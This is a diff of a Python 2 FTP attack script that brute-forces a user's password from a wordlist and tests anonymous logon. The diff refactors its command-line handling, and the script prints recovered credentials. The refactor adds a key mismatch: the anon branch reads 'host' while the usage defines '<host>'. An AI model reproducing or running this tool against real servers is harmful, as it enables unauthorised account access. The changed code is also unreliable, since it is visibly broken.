@@ -8,15 +8,12 @@
     Don't be a moron, please don't use this for something illegal.
 
     Usage:
-        ftp.py brute [-v <host> <user> <password_file>]
-        ftp.py anon [-v <host>]
+        ftp.py brute [-v] <host> <user> <password_file>
+        ftp.py anon [-v] <host>
         ftp.py -h | --help
         ftp.py --version
 
     Options:
-        host            Host name to scan/attack
-        user            Username to attack against
-        password_file   newline separated wordlist
         -v              verbose
         -h --help       Show this screen.
         --version       Show version
@@ -66,37 +63,17 @@ def anon_login(hostname):
 
 def main(arguments):
     if arguments['anon']:
-        if not arguments['<host>']:
-            host = raw_input("Hostname: ")
-        else:
-            host = arguments['<host>']
-
-        anon = anon_login(host)
+        anon = anon_login(arguments['host'])
 
         if anon:
-            print escape_color('[*] ' + str(host) + ' FTP Anonymous Logon Succeeded.', "green")
+            print escape_color('[*] ' + str(arguments['host']) + ' FTP Anonymous Logon Succeeded.', "green")
         else:
-            print escape_color('[-] ' + str(host) + ' FTP Anonymous Logon Failed.', "red")
+            print escape_color('[-] ' + str(arguments['host']) + ' FTP Anonymous Logon Failed.', "red")
     elif arguments['brute']:
-        if not arguments['<host>']:
-            host = raw_input("Hostname: ")
-        else:
-            host = arguments['<host>']
-
-        if not arguments['<user>']:
-            user = raw_input("User name: ")
-        else:
-            user = arguments['<user>']
-
-        if not arguments['<password_file>']:
-            password_file = raw_input("Password File Path: ")
-        else:
-            password_file = arguments['<password_file>']
-
         if arguments['-v']:
-            credentials = brute_login(host, user, password_file, verbose=True)
+            credentials = brute_login(arguments['<host>'], arguments['<user>'], arguments['<password_file>'], verbose=True)
         else:
-            credentials = brute_login(host, user, password_file)
+            credentials = brute_login(arguments['<host>'], arguments['<user>'], arguments['<password_file>'])
 
         if credentials:
             print escape_color('[*] FTP Logon Succeeded: ' + credentials[0] + ":" + credentials[1], "green")
